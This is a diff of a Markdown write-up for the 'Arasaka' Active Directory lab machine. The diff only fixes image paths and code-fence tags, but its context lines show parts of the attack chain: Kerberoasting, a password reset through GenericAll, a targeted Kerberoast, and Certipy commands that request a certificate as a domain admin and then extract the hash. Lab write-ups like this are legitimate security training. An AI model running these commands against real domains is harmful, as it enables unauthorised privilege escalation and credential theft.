@@ -1,5 +1,5 @@
 # Arasaka
-![arasaka](../../assets/images/arasaka-pic.png)
+![arasaka](../assets/images/arasaka-pic.png)
 
 ??? info 
     Author: Dcyberguy
@@ -148,7 +148,7 @@ LDAP        10.1.81.88      389    DC01             Compressing output into /hom
 
 Faraday user has not `outbound Object Control`. This is a dead-end
 
-![arasaka](../../assets/images/arasaka.png)
+![arasaka](../assets/images/arasaka.png)
 
 ### Kerberoasting
 
@@ -183,7 +183,7 @@ Session completed.
 
 `ALT.SVC` has `generic.all` over `YORINOBU`. So I can change his password
 
-![arasaka](../../assets/images/arasaka-1.png)
+![arasaka](../assets/images/arasaka-1.png)
 
 He also has access to the Windows Remote Services
 
@@ -200,7 +200,7 @@ WINRM       10.1.81.88      5985   DC01             [+] hacksmarter.local\yorino
 
 Looking at `Bloodhound` The Yorinobu has `Generic-Write` over `Soulkiller.svc` user account, which would allow me do a `targetedkerberberoast` and dump the `Soulkiller.svc` password hash
 
-![arasaka](../../assets/images/arasaka-2.png)
+![arasaka](../assets/images/arasaka-2.png)
 
 ```jsx
 targetedKerberoast git:(main) ./targetedKerberoast.py -v -d 'HACKSMARTER.local' -u 'yorinobu' -p 'Valentino1@'
@@ -350,7 +350,7 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
 In `Bloodhound` Both Administrator and the_emperor are Domain Admin, Maybe I can get the emperor’s hash
 
-```abap
+```bash
 certipy req -username soulkiller.svc@HACKSMARTER.local -password 'MYpassword123#' -target-ip DC01.HACKSMARTER.local -dc-ip 10.1.81.88 -ca 'hacksmarter-DC01-CA' -template 'AI_Takeover' -upn 'the_emperor@HACKSMARTER.local'
 /home/parrot/.local/pipx/venvs/certipy-ad/lib/python3.11/site-packages/certipy/version.py:1: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
   import pkg_resources
@@ -366,7 +366,7 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
 Then dump the hash
 
-```abap
+```bash
 certipy auth -pfx the_emperor.pfx -u the_emperor -domain HACKSMARTER.local  -dc-ip 10.1.81.88 -debug
 /home/parrot/.local/pipx/venvs/certipy-ad/lib/python3.11/site-packages/certipy/version.py:1: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
   import pkg_resources
@@ -383,7 +383,7 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
 Since both the Administrator and the_emperor are Administrator’s, he would have the permissions to read the root.txt file
 
-![arasaka](../../assets/images/arasaka-3.png)
+![arasaka](../assets/images/arasaka-3.png)
 
 ```shell
 *Evil-WinRM* PS C:\Users\the_emperor\Desktop> cd ..
